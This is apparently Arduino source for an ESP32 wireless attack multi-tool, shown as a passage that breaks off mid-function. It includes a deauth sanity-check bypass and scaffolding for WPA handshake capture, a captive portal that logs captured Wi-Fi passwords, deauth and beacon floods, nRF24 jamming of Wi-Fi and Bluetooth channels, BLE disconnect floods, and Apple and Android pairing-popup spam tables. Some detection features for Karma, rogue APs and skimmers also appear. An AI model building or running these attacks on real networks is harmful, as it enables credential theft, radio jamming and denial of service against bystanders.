#include <DNSServer.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include <SPI.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_task_wdt.h"
#include "tcpip_adapter.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <RF24.h>
#include <FS.h>
#include <SPIFFS.h>
#include "mbedtls/md5.h"
#include "mbedtls/sha1.h"
#include "mbedtls/pkcs5.h"
#include "esp_wpa2.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_gattc_api.h"
#include "esp_gatts_api.h"
#include "esp_bt_main.h"

portMUX_TYPE counterMux = portMUX_INITIALIZER_UNLOCKED;

// Performance optimization flags
bool nrfTurboMode = false;  // When true, UI freezes for max speed
unsigned long nrfLastStats = 0;

// SPI speed constant (ADD THIS)
#define NRF_SPI_SPEED 16000000

// Thread-safe increment macros
#define SAFE_INCREMENT(counter) do { \
  portENTER_CRITICAL(&counterMux); \
  counter++; \
  portEXIT_CRITICAL(&counterMux); \
} while(0)

#define SAFE_ADD(counter, value) do { \
  portENTER_CRITICAL(&counterMux); \
  counter += value; \
  portEXIT_CRITICAL(&counterMux); \
} while(0)

#define SAFE_READ(counter, dest) do { \
  portENTER_CRITICAL(&counterMux); \
  dest = counter; \
  portEXIT_CRITICAL(&counterMux); \
} while(0)

// ==================== MARAUDER DEAUTH BYPASS ====================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

// ==================== HANDSHAKE CAPTURE ====================
struct HandshakeData {
  uint8_t anonce[32];
  uint8_t snonce[32];
  uint8_t clientMAC[6];
  uint8_t apMAC[6];
  uint8_t mic[16];
  bool captured;
};

HandshakeData capturedHandshake;

// ==================== TFT DISPLAY ====================
TFT_eSPI tft = TFT_eSPI();

// ==================== DNS SERVER & WEB SERVER ====================
DNSServer dnsServer;
WebServer webServer(80);

// ==================== nRF24L01 DUAL MODULE SETUP ====================
#define NRF1_CE_PIN  26   // Changed from 4
#define NRF1_CSN_PIN 25   // Changed from 15
#define NRF2_CE_PIN  33   // Changed from 2
#define NRF2_CSN_PIN 27   // Kept same (OK)
#define HSPI_MISO 12      // Kept same
#define HSPI_MOSI 13      // Kept same
#define HSPI_SCLK 14      // Kept same
//#define CC1101_CS    22
//#define CC1101_GDO0  4
//#define CC1101_GDO2  15
// CC1101 shares VSPI pins:
// MOSI: 23 (shared with TFT)
// MISO: 19 (shared with TFT)
// SCLK: 18 (shared with TFT)

const uint8_t ble_channels[] = {37, 38, 39};
uint8_t current_ble_channel = 0;

// Enhanced jammer stats
uint32_t bleDisconnectsSent = 0;
uint32_t bleConnectFloodSent = 0;

// Pre-built packets for speed
uint8_t adv_spam_packet[31];
uint8_t disconnect_packet[31];
uint8_t connect_flood_packet[31];

SPIClass hspi(HSPI);
RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN, NRF_SPI_SPEED); 
RF24 radio2(NRF2_CE_PIN, NRF2_CSN_PIN, NRF_SPI_SPEED);

bool nrf1Available = false;
bool nrf2Available = false;

// ==================== NETWORK VARIABLES ====================
String selectedSSID = "";
String capturedPassword = "";
bool portalActive = false;
int scanResults = 0;

// ==================== BLE SCANNER ====================
BLEScan* pBLEScan = nullptr;
BLEAdvertising* pAdvertising = nullptr;
int bleScanTime = 5;

// ==================== BLE JAMMER MODES & STATS ====================
enum BLEJamMode {
  JAM_SPAM,           // Spam fake devices (discovery disruption)
  JAM_DEAUTH,         // Actively disconnect devices
  JAM_FLOOD,          // Flood with connection requests
  JAM_AGGRESSIVE      // ALL ATTACKS (most effective)
};

BLEJamMode currentBLEJamMode = JAM_AGGRESSIVE;

// BLE Attack statistics
uint32_t bleSpamPackets = 0;
uint32_t bleDeauthPackets = 0;
uint32_t bleFloodPackets = 0;
uint32_t bleTargetsFound = 0;

// BLE Target list (for deauth attacks)
struct BLETarget {
  uint8_t addr[6];
  uint8_t addrType;
  int8_t rssi;
  bool active;
  unsigned long lastSeen;
};

BLETarget bleTargets[20];
int bleTargetCount = 0;

// ==================== CONSOLE BUFFER ====================
String consoleBuffer[15];
int consoleIndex = 0;

// ==================== PACKET SNIFFER VARIABLES ====================
bool snifferActive = false;
uint32_t packetCount = 0;
uint32_t beaconCount = 0;
uint32_t dataCount = 0;
uint32_t deauthCount = 0;
uint8_t snifferChannel = 1;

#define MAX_SNIFFER_PACKETS 100U

struct PacketInfo {
  uint8_t type;
  int8_t rssi;
  uint8_t channel;
  unsigned long timestamp;
};

PacketInfo packetHistory[MAX_SNIFFER_PACKETS];
int packetHistoryIndex = 0;
int snifferScrollOffset = 0;

// ==================== ROGUE AP DETECTOR STRUCTURES ====================
struct RogueAP {
  String ssid;
  uint8_t legitimateBSSID[6];
  uint8_t rogueBSSID[6];
  int32_t legitimateRSSI;
  int32_t rogueRSSI;
  uint8_t legitimateChannel;
  uint8_t rogueChannel;
  unsigned long firstSeen;
  unsigned long lastSeen;
  int detectionCount;
  uint8_t confidenceScore;  // 0-100%
  String suspiciousReason;
};

struct APHistory {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  unsigned long firstSeen;
  unsigned long lastSeen;
  bool inWhitelist;
  int signalFluctuations;
  int channelChanges;
};

RogueAP detectedRogues[20];
int rogueAPCount = 0;

APHistory apHistoryList[50];
int apHistoryCount = 0;

uint8_t whitelistedBSSIDs[30][6];
String whitelistedSSIDs[30];
int whitelistCount = 0;

bool rogueAPScanActive = false;
int rogueScrollOffset = 0;

// ==================== BLE JAMMER VARIABLES ====================
bool bleJammerActive = false;
unsigned long lastBLEJamTime = 0;
uint32_t bleJamPackets = 0;  // KEEP THIS - it's the total counter
String jammerModeText = "Aggressive";

// ==================== nRF24 JAMMER VARIABLES ====================
bool nrfJammerActive = false;
bool dualNRFMode = true;
uint32_t nrfJamPackets = 0;
uint32_t nrf1Packets = 0;
uint32_t nrf2Packets = 0;
unsigned long lastNRFJamTime = 0;

// WiFi Clown V2 sweep variables
const byte wifi_ch1_sweep[] = {7, 9, 11, 13, 15, 17};   // WiFi Channel 1 (2412 MHz)
const byte wifi_ch6_sweep[] = {32, 34, 36, 38, 40, 42}; // WiFi Channel 6 (2437 MHz)
const byte wifi_ch11_sweep[] = {57, 59, 61, 63, 65, 67}; // WiFi Channel 11 (2462 MHz)

byte wifi_jam_mode = 0;  // 0=Ch1, 1=Ch6, 2=Ch11
byte sweep_index_radio1 = 0;
byte sweep_index_radio2 = 3; // Offset for dual coverage

unsigned long lastChannelChange = 0;
const unsigned long DWELL_TIME_MS = 20; // Stay 20ms per channel

// Smoochiee's hopping pattern variables
unsigned int flag_radio1 = 0;   // Direction flag for radio 1
unsigned int flag_radio2 = 0;   // Direction flag for radio 2
int nrf_ch1 = 2;    // Radio 1 current channel (start low)
int nrf_ch2 = 45;   // Radio 2 current channel (start mid, offset pattern)

// Jamming mode
enum NRFJamMode {
  NRF_SWEEP,      // Smoochiee's sweep pattern (most effective)
  NRF_RANDOM,     // Random hopping (chaotic)
  NRF_FOCUSED,    // Focused on critical BT/BLE channels
  NRF_WIFI_CLOWN  // RF-Clown V2: WiFi channel blocking
};

NRFJamMode nrfJamMode = NRF_SWEEP;  // Default to Smoochiee's method

// Critical BT/BLE channels - focus here for max effect
byte hopping_channel[] = { 
  2, 26, 80,              // BLE advertising (most critical!)
  0, 1, 4, 6, 8,          // BLE data low
  22, 24, 28, 30,         // BT Classic hotspots
  32, 34, 46, 48, 50, 52, // BT Classic more
  74, 76, 78, 82, 84, 86  // BLE data high
};

const byte wifi_channels_nrf[] = {12, 37, 62};
byte wifi_jam_index = 0;

byte ptr_hop1 = 0;  // Radio 1 pointer
byte ptr_hop2 = 12; // Radio 2 pointer (offset by half array)

// ==================== BEACON FLOOD VARIABLES ====================
String customBeacons[20] = {};
int customBeaconCount = 0;
int beaconDisplayOffset = 0;
const int MAX_DISPLAY_BEACONS = 5;

// ==================== ANIMATION VARIABLES ====================
float skullX = 120;
float skullY = 160;
float skullVelX = 2;
float skullVelY = 1.5;
unsigned long lastAnimTime = 0;
bool showSkull = false;

// ==================== UI VARIABLES ====================
int hoveredIndex = -1;
int selectedMenuIndex = -1;
unsigned long lastTouchTime = 0;
#define HOVER_DELAY 100

// ==================== WIFI SCAN VARIABLES ====================
bool continuousWiFiScan = false;
unsigned long lastWiFiScanTime = 0;
int scanDisplayOffset = 0;
const int MAX_DISPLAY_APS = 7;
int wifiScrollOffset = 0;
#define MAX_WIFI_DISPLAY 9

// ==================== BLE SCAN VARIABLES ====================
bool continuousBLEScan = false;
unsigned long lastBLEScanUpdate = 0;

// ==================== AIRTAG DETECTION ====================
struct AirTagDevice {
  String address;
  int rssi;
  unsigned long lastSeen;
  int detectionCount;
};

AirTagDevice airTags[20];
int airTagCount = 0;

// ==================== CARD SKIMMER DETECTION ====================
struct SkimmerSignature {
  String name;
  int rssi;
  unsigned long detected;
};

SkimmerSignature skimmers[10];
int skimmerCount = 0;

// ==================== DEAUTH SNIFFER ====================
bool deauthSnifferActive = false;
uint32_t detectedDeauths = 0;

struct DeauthEvent {
  uint8_t sourceMAC[6];
  uint8_t targetMAC[6];
  int8_t rssi;
  unsigned long timestamp;
  uint8_t channel;
};

DeauthEvent deauthEvents[50];
int deauthEventCount = 0;
int deauthScrollOffset = 0;
#define MAX_DEAUTH_DISPLAY 8

// ==================== RF CAPTURE STRUCTURES ====================
struct RFSignal {
  uint8_t channel;
  uint8_t data[32];
  uint8_t dataLen;
  int8_t rssi;
  unsigned long timestamp;
  uint32_t frequency;
  String description;
};

RFSignal capturedSignals[50];
int capturedSignalCount = 0;
int rfCaptureScrollOffset = 0;
bool rfCaptureActive = false;

// Forward declaration for RF functions
String generatePacketName(RFSignal* signal);

// Forward declaration for RF functions
String generatePacketName(RFSignal* signal);


// ==================== RF MENU STATE VARIABLES ====================
enum RFType {
  RF_NONE,
  RF_NRF24,
  RF_SUBGHZ
};

RFType selectedRFType = RF_NONE;

// RF Monitor animation variables
float wavePhase = 0.0;
unsigned long lastWaveUpdate = 0;

// RF Monitor animation variables

uint8_t channelActivity[126];  // Track activity on each channel
unsigned long lastChannelScan = 0;

// RF Replay
int selectedSignalIndex = -1;

// ==================== PROBE REQUEST SNIFFER ====================
bool probeSnifferActive = false;
uint32_t totalProbeRequests = 0;
int probeScrollOffset = 0;

struct ProbeRequest {
  uint8_t clientMAC[6];
  String ssid;
  int8_t rssi;
  uint8_t channel;
  unsigned long timestamp;
  uint16_t count;
};

ProbeRequest probeRequests[50];
int probeRequestCount = 0;

// ==================== MANAGEMENT FRAME SNIFFER ====================
bool mgmtSnifferActive = false;
uint32_t totalMgmtFrames = 0;
uint32_t authFrames = 0;
uint32_t assocFrames = 0;
uint32_t probeFrames = 0;
uint32_t otherMgmtFrames = 0;
int mgmtScrollOffset = 0;

struct MgmtFrame {
  uint8_t type;
  uint8_t subtype;
  uint8_t sourcMAC[6];
  uint8_t destMAC[6];
  int8_t rssi;
  uint8_t channel;
  unsigned long timestamp;
  String description;
};

MgmtFrame mgmtFrames[50];
int mgmtFrameCount = 0;

// ==================== BEACON ANALYZER ====================
bool beaconAnalyzerActive = false;
uint32_t totalBeacons = 0;
int beaconScrollOffset = 0;
int selectedBeaconIndex = -1;

struct BeaconInfo {
  String ssid;
  uint8_t bssid[6];
  uint8_t channel;
  int8_t rssi;
  uint8_t encryptionType;
  bool wpsEnabled;
  bool wmmEnabled;
  String vendor;
  uint16_t beaconInterval;
  uint32_t beaconCount;
  unsigned long firstSeen;
  unsigned long lastSeen;
  uint8_t capabilities[2];
  uint8_t supportedRates[8];
  uint8_t numRates;
};

BeaconInfo beacons[30];

// ==================== MENU STATES ====================
enum MenuState {
  BOOT_ANIMATION,
  MAIN_MENU,
  WIFI_MENU,
  WIFI_SCAN,
  SELECT_TARGET,
  WIFI_ATTACK_MENU,
  BEACON_MANAGER,
  BEACON_ADD,
  CAPTURED_PASSWORDS,
  HANDSHAKE_CAPTURE,
  BLE_MENU,
  BLE_SCAN_RESULTS,
  BLE_JAM_MENU,
  BLE_JAM_ACTIVE,
  RF_MENU,
  RF_TYPE_MENU,
  RF_MONITOR,
  RF_CAPTURE,
  RF_REPLAY,
  PROBE_SNIFFER_ACTIVE,
  MGMT_SNIFFER_ACTIVE,
  BEACON_ANALYZER_ACTIVE,
  BT_CLASSIC_SNIFFER_ACTIVE,
  BLE_SNIFFER_ACTIVE,
  CONTROL_SNIFFER_ACTIVE,
  DATA_SNIFFER_ACTIVE,
  NRF_JAM_MENU,
  NRF_JAM_ACTIVE,
  WIFI_BLE_NRF_JAM,
  AIRTAG_SCANNER,
  AIRTAG_RESULTS,
  SKIMMER_DETECTOR,
  SKIMMER_RESULTS,
  CAPTIVE_PORTAL_MENU,
  SNIFFER_MENU,
  FRAME_SNIFFER_SUBMENU,
  SNIFFER_ACTIVE,
  WIFI_SNIFFER_SUBMENU, 
  BLE_SNIFFER_SUBMENU,  
  DEAUTH_SNIFFER,
  KARMA_DETECTOR,
  DEAUTH_SNIFFER_ACTIVE,
  WARDRIVING_MODE,
  ROGUE_AP_DETECTOR,
  SPAM_MENU,
  MORE_TOOLS_MENU,
  CONSOLE_VIEW,
  SETTINGS_MENU,
  DEVICE_INFO,
  ASCII_ART_VIEWER
};

MenuState currentState = BOOT_ANIMATION;
MenuState previousState = MAIN_MENU;
int selectedIndex = 0;
int scrollOffset = 0;

// ==================== BLE SCAN RESULTS ====================
struct BLEResult {
  String address;
  String name;
  int rssi;
  String type;
};

BLEResult bleDevices[50];
int bleDeviceCount = 0;

// Apple Company ID: 0x4C00 (Little Endian: 0x00, 0x4C)

// Proximity Pairing - AirPods popup
const uint8_t apple_proximity_pair[] = {
  0x07,  // Type: Proximity Pairing
  0x19,  // Length: 25 bytes
  0x01,  // Status flags
  0x02, 0x20,  // Device model (0x0220 = AirPods)
  0x00,  // Status
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Device address (random)
  0x00,  // Hint
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Reserved
  0x00, 0x00, 0x00  // Battery levels
};

// Nearby Action - AppleTV/AirDrop popup
const uint8_t apple_nearby_action[] = {
  0x0F,  // Type: Nearby Action
  0x05,  // Length: 5 bytes
  0x00,  // Action flags
  0xC0,  // Action type (AppleTV)
  0x00, 0x00, 0x00  // Authentication tag
};

// AirTag found
const uint8_t apple_airtag_popup[] = {
  0x07,  // Type: Proximity Pairing
  0x19,  // Length
  0x01,
  0x01, 0x42,  // Model: AirTag
  0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00
};

// Apple device models for Proximity Pairing (0x07)
const uint16_t apple_models[] = {
  0x0220,  // AirPods
  0x0F20,  // AirPods Pro
  0x1320,  // AirPods Max
  0x1420,  // AirPods Gen 3
  0x0142,  // AirTag
  0x0055,  // Airtag
  0x0030,  // Hermes AirTag
  0x0620,  // Beats Solo 3
  0x0320,  // Powerbeats 3
  0x0520   // BeatsX
};

// Nearby Action types (0x0F)
const uint8_t apple_actions[] = {
  0xC0,  // AppleTV Setup
  0xC1,  // Mobile Backup
  0xC3,  // AppleTV Pair
  0xC5,  // AppleTV New User
  0xC6,  // AppleTV AppleID Setup
  0xC8,  // AppleTV Wireless Audio Sync
  0xC9,  // AppleTV HomeKit Setup
  0xCB,  // AppleTV Keyboard
  0xD0   // Join this AppleTV?
};

// ==================== ANDROID FAST PAIR PACKET STRUCTURES ====================

// Google Fast Pair - Model IDs that trigger "Connect your device" popup
const uint32_t android_models[] = {
  0x2D7A23,  // Pixel Buds
  0x0001F0,  // Pixel Buds A-Series
  0x718FA4,  // Galaxy Buds
  0x92BBBD,  // Galaxy Buds+ 
  0x9C64F4,  // Galaxy Buds Live
  0xB49271,  // Galaxy Buds Pro
  0x2D5F14,  // JBL Live Pro+
  0x0E30C3,  // Sony WF-1000XM3
  0xCD8256,  // Bose QC Earbuds
  0x454E53,  // Nothing Ear (1)
  0x0003F0,  // Pixel Buds Pro
  0x003001,  // OnePlus Buds Pro
  0xD320D9   // Xiaomi Buds 4
};

// ==================== ATTACK VARIABLES ====================
bool deauthActive = false;
bool useAlternativeDeauth = false;
uint8_t currentDeauthMethod = 0;  // 0=Standard, 1=Storm
bool beaconFloodActive = false;
bool appleSpamActive = false;
bool androidSpamActive = false;
unsigned long lastAppleSpam = 0;
unsigned long lastAndroidSpam = 0;
uint32_t appleSpamCount = 0;
uint32_t androidSpamCount = 0;
unsigned long lastAttackTime = 0;
uint32_t deauthPacketsSent = 0;

// ==================== WARDRIVING ====================
struct WardrivingData {
  int totalAPs;
  int openAPs;
  int securedAPs;
  String strongestSSID;
  int strongestRSSI;
};

WardrivingData wardrivingStats;

// ==================== CAPTURED CREDENTIALS ====================
struct CapturedCredential {
  String ssid;
  String bssid;
  String password;
  unsigned long timestamp;
  bool validated;
  bool likelyCorrect;
};

CapturedCredential capturedCreds[20];
int capturedCredCount = 0;
int credDisplayOffset = 0;
#define MAX_DISPLAY_CREDS 6

// ==================== NETWORK INFO ====================
struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  uint8_t encryptionType;
  String encryption;
  bool isEncrypted;
  unsigned long lastSeen;
  bool isNew;
};

NetworkInfo networks[50];
int networkCount = 0;

// ==================== Deauth Flood Variables ====================
bool deauthFloodActive = false;
uint32_t deauthFloodPackets = 0;
unsigned long lastDeauthFloodUpdate = 0;

struct DeauthTarget {
  String ssid;
  uint8_t bssid[6];
  uint8_t channel;
  uint32_t packetsSent;
  bool active;
};

DeauthTarget deauthTargets[50];
int deauthTargetCount = 0;

int bleScrollOffset = 0;
int airtagScrollOffset = 0;
int skimmerScrollOffset = 0;

// ==================== BLE FRAME SNIFFER WITH DEVICE DETECTION ====================
bool bleSnifferActive = false;
uint32_t bleFrameCount = 0;
uint32_t bleAdvCount = 0;
uint32_t bleConnCount = 0;
uint32_t bleScanReqCount = 0;
int bleSnifferScrollOffset = 0;

struct BLEFrameInfo {
  uint8_t type;        // 0=ADV, 1=SCAN_REQ, 2=CONN_REQ, 3=DATA
  uint8_t addr[6];
  int8_t rssi;
  uint8_t dataLen;
  uint8_t data[31];
  unsigned long timestamp;
  String description;
  String deviceType;   // ← NEW: Device type identification
};

// ==================== CLASSIC BLUETOOTH SNIFFER ====================
bool btClassicSnifferActive = false;
uint32_t btClassicFrameCount = 0;
uint32_t btInquiryCount = 0;
uint32_t btPageCount = 0;
uint32_t btConnectionCount = 0;
int btClassicScrollOffset = 0;

struct BTClassicFrame {
  uint8_t type;        // 0=Inquiry, 1=Page, 2=Connection, 3=ACL Data
  uint8_t addr[6];     // Bluetooth address
  int8_t rssi;
  uint8_t channel;     // BT channel (0-78)
  unsigned long timestamp;
  String description;
  String deviceName;
  uint32_t classOfDevice;  // Device class
};

// ==================== CONTROL FRAME SNIFFER ====================
bool controlSnifferActive = false;
uint32_t totalControlFrames = 0;
uint32_t rtsFrames = 0;
uint32_t ctsFrames = 0;
uint32_t ackFrames = 0;
uint32_t blockAckFrames = 0;
int controlScrollOffset = 0;

struct ControlFrame {
  uint8_t type;        // 0=RTS, 1=CTS, 2=ACK, 3=BlockACK
  uint8_t sourceMAC[6];
  uint8_t destMAC[6];
  int8_t rssi;
  uint8_t channel;
  unsigned long timestamp;
  String description;
  uint16_t duration;   // Frame duration
};

ControlFrame controlFrames[50];
int controlFrameCount = 0;

// ==================== DATA FRAME SNIFFER ====================
bool dataSnifferActive = false;
uint32_t totalDataFrames = 0;
uint32_t qosDataFrames = 0;
uint32_t nullDataFrames = 0;
uint32_t cfAckFrames = 0;
uint32_t qosNullFrames = 0;
int dataScrollOffset = 0;

struct DataFrame {
  uint8_t type;        // 0=Data, 1=QoS Data, 2=Null, 3=QoS Null
  uint8_t sourceMAC[6];
  uint8_t destMAC[6];
  int8_t rssi;
  uint8_t channel;
  unsigned long timestamp;
  String description;
  uint16_t dataLen;
  uint8_t priority;    // QoS priority (0-7)
};

DataFrame dataFrames[50];
int dataFrameCount = 0;

#define MAX_BT_CLASSIC_FRAMES 50
BTClassicFrame btClassicFrames[MAX_BT_CLASSIC_FRAMES];
int btClassicFrameIndex = 0;

#define MAX_BLE_FRAMES 50
BLEFrameInfo bleFrames[MAX_BLE_FRAMES];
int bleFrameIndex = 0;

// ==================== KARMA / EVIL TWIN DETECTOR ====================

struct KarmaAP {
  String ssid;
  uint8_t bssid[6];
  uint8_t channel;
  int8_t rssi;
  unsigned long firstSeen;
  unsigned long lastSeen;
  uint16_t probeResponseCount;
  uint16_t clientCount;
  bool respondsToAll;  // Responds to any probe request (Karma attack)
  bool hasClients;
  uint8_t threatLevel;  // 0-100
  String threatReason;
};

KarmaAP karmaAPs[30];
int karmaAPCount = 0;
bool karmaDetectorActive = false;
int karmaScrollOffset = 0;

struct ProbeTest {
  String randomSSID;
  unsigned long sentTime;
  bool gotResponse;
  uint8_t responderBSSID[6];
};

ProbeTest probeTests[5];
int probeTestIndex = 0;

// ==================== SCREEN SIZE ====================
#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

// ==================== LAYOUT SPACING ====================
#define HEADER_HEIGHT 24
#define SIDE_MARGIN 6
#define MENU_ITEM_HEIGHT 22
#define MENU_SPACING 6
#define BUTTON_WIDTH 180
#define BUTTON_HEIGHT 32
#define BUTTON_SPACING 8

// ==================== COLORS (KALI TERMINAL THEME) ====================
#define COLOR_BG           0x0000  // Pure black
#define COLOR_TERMINAL_BG  0x0000
#define COLOR_TEXT         0xCE79  // Light grey
#define COLOR_GREEN        0x07E0  // Kali green
#define COLOR_DARK_GREEN   0x0320  // Dark green
#define COLOR_CYAN         0x07FF
#define COLOR_YELLOW       0xFFE0
#define COLOR_RED          0xF800
#define COLOR_BLUE         0x001F
#define COLOR_PURPLE       0x780F
#define COLOR_ORANGE       0xFD20
#define COLOR_WHITE        0xFFFF
#define COLOR_GREY         0x7BEF
#define COLOR_HOVER_BG     0x18E3
#define COLOR_SELECTED_BG  0x2104

// Legacy aliases
#define COLOR_HEADER       COLOR_TERMINAL_BG
#define COLOR_ITEM_BG      COLOR_TERMINAL_BG
#define COLOR_BORDER       COLOR_DARK_GREEN
#define COLOR_WARNING      COLOR_ORANGE
#define COLOR_SUCCESS      COLOR_GREEN
#define COLOR_CRITICAL     COLOR_RED
#define COLOR_ACCENT       COLOR_GREEN
#define COLOR_MATRIX_GREEN COLOR_GREEN
#define COLOR_LIME         0x87F0

// ==================== FORWARD DECLARATIONS ====================
void drawMainMenu();
void drawWiFiMenu();
void drawBLEMenu();
void drawAttackMenu();
void drawBLEJammerMenu();
void showMessage(const char* msg, uint16_t color);
void updateBLEJammerDisplay();
void addToConsole(String message);
void handleBeaconAddTouch(int x, int y);

#define HOVER_DELAY 100

// ==================== TERMINAL-STYLE HEADER ====================
void drawTerminalHeader(const char* title) {
  tft.fillScreen(COLOR_BG);
  
  // Top border line (Kali green)
  tft.drawFastHLine(0, 0, 240, COLOR_GREEN);
  
  // Header text - terminal style with prompt
  tft.setTextSize(1);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(5, 8);
  tft.print("root@p4wnc4k3");
  tft.setTextColor(COLOR_WHITE);
  tft.print(":");
  tft.setTextColor(COLOR_CYAN);
  tft.print("~");
  tft.setTextColor(COLOR_WHITE);
  tft.print("# ");
  tft.setTextColor(COLOR_TEXT);
  tft.print(title);
  
  // Bottom border
  tft.drawFastHLine(0, HEADER_HEIGHT - 1, 240, COLOR_GREEN);
}

void drawCenteredButton(const char* text, uint16_t color = COLOR_RED, int y = 305) {
  tft.drawFastHLine(0, y - 2, 240, COLOR_GREEN);
  tft.setTextSize(1);
  tft.setTextColor(color);
  
  // Calculate center position
  int textWidth = strlen(text) * 6; // 6 pixels per character in size 1
  int x = (240 - textWidth) / 2;
  
  tft.setCursor(x, y + 3);
  tft.print(text);
}

// ==================== KARMA DETECTOR CALLBACK ====================
void IRAM_ATTR karmaDetectorCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  if (type != WIFI_PKT_MGMT) return;
  
  uint8_t frameType = pkt->payload[0];
  uint8_t frameSubtype = (frameType & 0xF0) >> 4;
  
  // Monitor Probe Responses (0x05)
  if (frameSubtype == 0x05) {
    uint8_t sourceBSSID[6];
    memcpy(sourceBSSID, &pkt->payload[10], 6);
    
    // Extract SSID from probe response
    int ssidLen = 0;
    String ssid = "";
    
    if (pkt->rx_ctrl.sig_len > 26 && pkt->payload[24] == 0x00) {
      ssidLen = pkt->payload[25];
      if (ssidLen > 0 && ssidLen <= 32 && (26 + ssidLen) < pkt->rx_ctrl.sig_len) {
        char ssidBuf[33] = {0};
        memcpy(ssidBuf, &pkt->payload[26], ssidLen);
        ssid = String(ssidBuf);
      }
    }
    
    if (ssid.length() == 0) return;
    
    // Check if this is a response to our random probe test
    for (int i = 0; i < 5; i++) {
      if (probeTests[i].randomSSID == ssid && !probeTests[i].gotResponse) {
        probeTests[i].gotResponse = true;
        memcpy(probeTests[i].responderBSSID, sourceBSSID, 6);
        
        // KARMA DETECTED! AP responded to fake SSID
        updateKarmaAP(ssid, sourceBSSID, pkt->rx_ctrl.rssi, 
                     pkt->rx_ctrl.channel, true);
        break;
      }
    }
    
    // Also track legitimate probe responses
    updateKarmaAP(ssid, sourceBSSID, pkt->rx_ctrl.rssi, 
                 pkt->rx_ctrl.channel, false);
  }
  
  // Monitor Beacons (0x08) for client tracking
  else if (frameSubtype == 0x08) {
    uint8_t bssid[6];
    memcpy(bssid, &pkt->payload[16], 6);
    
    // Check TIM element for associated clients
    bool hasClients = false;
    int offset = 36;
    
    while (offset < pkt->rx_ctrl.sig_len - 2) {
      uint8_t tagNum = pkt->payload[offset];
      uint8_t tagLen = pkt->payload[offset + 1];
      
      if (tagLen == 0 || offset + 2 + tagLen > pkt->rx_ctrl.sig_len) break;
      
      if (tagNum == 0x05) {  // TIM element
        if (tagLen >= 4) {
          uint8_t bitmapControl = pkt->payload[offset + 4];
          if (bitmapControl > 0) hasClients = true;
        }
        break;
      }
      
      offset += 2 + tagLen;
    }
    
    // Update client status
    for (int i = 0; i < karmaAPCount; i++) {
      if (memcmp(karmaAPs[i].bssid, bssid, 6) == 0) {
        karmaAPs[i].hasClients = hasClients;
        if (hasClients) karmaAPs[i].clientCount++;
        break;
      }
    }
  }
}

// ==================== UPDATE KARMA AP ====================
void updateKarmaAP(String ssid, uint8_t* bssid, int8_t rssi, 
                   uint8_t channel, bool isKarmaResponse) {
  
  // Find existing AP
  int existingIndex = -1;
  for (int i = 0; i < karmaAPCount; i++) {
    if (memcmp(karmaAPs[i].bssid, bssid, 6) == 0) {
      existingIndex = i;
      break;
    }
  }
  
  unsigned long now = millis();
  
  if (existingIndex >= 0) {
    // Update existing
    KarmaAP* ap = &karmaAPs[existingIndex];
    
    if (isKarmaResponse) {
      ap->probeResponseCount++;
      ap->respondsToAll = true;
    }
    
    ap->rssi = rssi;
    ap->lastSeen = now;
    
    // Calculate threat level
    uint8_t threat = 0;
    String reason = "";
    
    // CRITICAL: Responds to fake SSIDs (definitive Karma)
    if (ap->respondsToAll) {
      threat += 70;
      reason = "KARMA ATTACK";
    }
    
    // HIGH: Many probe responses in short time
    if (ap->probeResponseCount > 10) {
      threat += 20;
      if (reason.length() > 0) reason += " + ";
      reason += "Mass probing";
    }
    
    // MEDIUM: Has clients (active evil twin)
    if (ap->hasClients) {
      threat += 10;
      if (reason.length() > 0) reason += " + ";
      reason += "Active clients";
    }
    
    ap->threatLevel = min((uint8_t)100, threat);
    ap->threatReason = reason;
    
  } else if (karmaAPCount < 30) {
    // Add new AP
    KarmaAP* ap = &karmaAPs[karmaAPCount];
    ap->ssid = ssid;
    memcpy(ap->bssid, bssid, 6);
    ap->channel = channel;
    ap->rssi = rssi;
    ap->firstSeen = now;
    ap->lastSeen = now;
    ap->probeResponseCount = isKarmaResponse ? 1 : 0;
    ap->clientCount = 0;
    ap->respondsToAll = isKarmaResponse;
    ap->hasClients = false;
    ap->threatLevel = isKarmaResponse ? 70 : 0;
    ap->threatReason = isKarmaResponse ? "KARMA ATTACK" : "";
    
    karmaAPCount++;
    
    if (isKarmaResponse) {
      Serial.printf("\n[!] KARMA ATTACK DETECTED!\n");
      Serial.printf("    AP: %s\n", ssid.c_str());
      Serial.printf("    BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      Serial.printf("    Channel: %d\n", channel);
      addToConsole("KARMA: " + ssid);
    }
  }
}

// ==================== SEND PROBE TEST ====================
void sendProbeTest() {
  // Generate random SSID (very unlikely to exist)
  String randomSSID = "TEST_";
  for (int i = 0; i < 8; i++) {
    randomSSID += char('A' + random(0, 26));
  }
  randomSSID += "_" + String(random(1000, 9999));
  
  // Store test
  probeTests[probeTestIndex].randomSSID = randomSSID;
  probeTests[probeTestIndex].sentTime = millis();
  probeTests[probeTestIndex].gotResponse = false;
  memset(probeTests[probeTestIndex].responderBSSID, 0, 6);
  
  probeTestIndex = (probeTestIndex + 1) % 5;
  
  // Build probe request frame
  uint8_t probeReq[200];
  int packetSize = 0;
  
  // Frame Control (Probe Request)
  probeReq[0] = 0x40;
  probeReq[1] = 0x00;
  
  // Duration
  probeReq[2] = 0x00;
